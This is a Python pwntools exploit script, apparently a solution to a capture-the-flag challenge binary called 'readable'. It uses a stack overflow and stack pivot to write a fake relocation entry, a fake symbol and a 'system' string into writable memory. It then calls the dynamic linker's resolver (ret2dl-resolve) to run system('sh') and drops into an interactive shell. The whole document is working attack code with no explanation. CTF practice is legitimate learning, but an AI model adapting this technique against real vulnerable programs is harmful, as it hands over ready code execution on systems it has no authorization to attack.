from pwn import *
p = process('./readable')

bss = 0x600910
def mwrite(addr, data):
	payload  = 'a'*16
	payload += p64( addr + 0x10 )		#change rbp
	payload += p64( 0x400505 )
	payload += data.ljust( 16, '\x00' )
	#payload += p64( addr + 0x40 )		
	payload += p64( 0x600f00)		
	payload += p64( 0x400505 )
	p.send( payload )
def gobss( ):
	payload  = 'a'*16
	payload += p64( bss )
	payload += p64( 0x400520)
	p.send( payload )

#relid = ( 0x600e08 - 0x400360 )/0x18
relid = ( 0x600000- 0x400360 )/0x18
symid = ( 0x600ea8 - 0x40031e )/0x18
strid = ( 0x600ee0 - 0x4002e0 )
print 'relid: ',hex(relid)
print hex(symid)
print hex( 0x40031e + symid*0x18 )
print hex(strid)
fake_got = 0x600f10
fake_rel = p64( fake_got ) + p32( 7 ) + p32( symid ) + p64( 0 )		
fake_sym = p32( strid ) + p32( 0x12 ) + p64( 0 ) + p64( 0 )	
fake_str = 'system\x00'					
mwrite(0x600e08, fake_rel[:16])
mwrite(0x600e18, fake_rel[16:])
mwrite(0x600ea8, fake_sym[:16])
mwrite(0x600eb8, fake_sym[16:])
mwrite(0x600ee0, fake_str)
mwrite(0x600ef0, 'sh\x00')

push_link_map = 0x4003d0
pop_rdi = 0x0000000000400593
pop_rsi_pop = 0x0000000000400591
pad  = ''
pad += p64(0x600960)
pad += p64(pop_rdi)
pad += p64(0x600ef0)
pad += p64(push_link_map)
pad += p64(relid)
mwrite(bss, pad[:16])
mwrite(bss + 0x10, pad[16:32])
mwrite(bss + 0x20, pad[32:])
raw_input('?')
gobss()

p.interactive()
